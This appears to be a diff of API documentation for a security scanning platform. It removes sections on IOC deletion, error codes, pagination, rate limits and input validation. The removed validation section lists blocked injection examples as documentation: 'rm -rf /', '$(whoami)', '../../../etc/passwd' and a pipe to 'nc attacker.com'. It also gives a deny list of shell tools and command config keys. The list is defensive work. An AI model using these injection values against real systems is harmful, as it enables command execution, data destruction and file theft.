-| DELETE | `/iocs/{id}` | Soft-delete (sets `active=false`). Match history in `ioc_matches` is preserved. | `threat_intel:write` |
-
-Schema: migration 000156. Correlator: `internal/app/ioc/correlator.go`. An
-indicator with `source_finding_id` set is what makes B6 loop-closing — a
-runtime match on that IOC reopens the linked finding to `confirmed`.
-
----
-
-## Error Responses
-
-All errors follow a consistent format:
-
-```json
-{
-  "error": {
-    "code": "ASSET_NOT_FOUND",
-    "message": "Asset with ID xyz not found"
-  }
-}
-```
-
-### Common Error Codes
-
-| Code | HTTP Status | Description |
-|------|-------------|-------------|
-| `UNAUTHORIZED` | 401 | Missing or invalid token |
-| `FORBIDDEN` | 403 | Insufficient permissions |
-| `NOT_FOUND` | 404 | Resource not found |
-| `VALIDATION_ERROR` | 400 | Invalid request data |
-| `CONFLICT` | 409 | Resource already exists |
-| `INTERNAL_ERROR` | 500 | Server error |
-
----
-
-## Pagination
-
-List endpoints support pagination:
-
-```
-GET /api/v1/assets?page=1&per_page=20&sort=name&order=asc
-```
-
-| Parameter | Default | Description |
-|-----------|---------|-------------|
-| `page` | 1 | Page number |
-| `per_page` | 20 | Items per page (max 100) |
-| `sort` | `created_at` | Sort field |
-| `order` | `desc` | Sort order (asc/desc) |
-
-Response includes pagination metadata:
-
-```json
-{
-  "data": [...],
-  "meta": {
-    "page": 1,
-    "per_page": 20,
-    "total": 150,
-    "total_pages": 8
-  }
-}
-```
-
----
-
-## Rate Limiting
-
-### Trigger Endpoint Rate Limits
-
-To prevent abuse and ensure fair resource usage, trigger endpoints are rate limited per tenant:
-
-| Endpoint | Limit | Window | Scope |
-|----------|-------|--------|-------|
-| `POST /scan-workflows/:id/runs` | 30 | 1 minute | Per tenant |
-| `POST /scans/:id/trigger` | 20 | 1 minute | Per tenant |
-| `POST /quick-scan` | 10 | 1 minute | Per tenant (stricter) |
-
-### Rate Limit Headers
-
-All rate-limited endpoints return standard headers:
-
-| Header | Description |
-|--------|-------------|
-| `X-RateLimit-Limit` | Maximum requests allowed in window |
-| `X-RateLimit-Remaining` | Remaining requests in current window |
-| `X-RateLimit-Reset` | Unix timestamp when limit resets |
-| `Retry-After` | Seconds to wait before retry (when limited) |
-
-### Rate Limit Response
-
-```json
-{
-  "code": "RATE_LIMIT_EXCEEDED",
-  "message": "Rate limit exceeded. Please try again later.",
-  "status": 429
-}
-```
-
----
-
-## Security Validation
-
-### Input Validation for Pipeline/Scan Operations
-
-All pipeline step configs and scan configs are validated for security before execution.
-
-### Blocked Patterns
-
-The following patterns are blocked in config values:
-
-| Category | Pattern | Example |
-|----------|---------|---------|
-| Shell metacharacters | `; & \| $ \`` | `target=example.com; rm -rf /` |
-| Command substitution | `$(...)` or backticks | `target=$(whoami)` |
-| Path traversal | `../` | `file=../../../etc/passwd` |
-| Dangerous tools | `curl`, `wget`, `nc`, `bash` | `target=\| nc attacker.com` |
-
-### Blocked Config Keys
-
-The following config keys are not allowed:
-
-```
-command, cmd, exec, execute, shell, bash, sh, script,
-eval, system, popen, subprocess, spawn, run_command,
-os_command, raw_command, custom_command
-```
-
-### Validation Error Response
-
-```json
-{
-  "code": "SECURITY_VALIDATION_FAILED",
-  "message": "Config value contains potentially dangerous pattern",
-  "status": 400
-}
-```
+A refused config answers `400` and is audited (`security.validation_failed`).
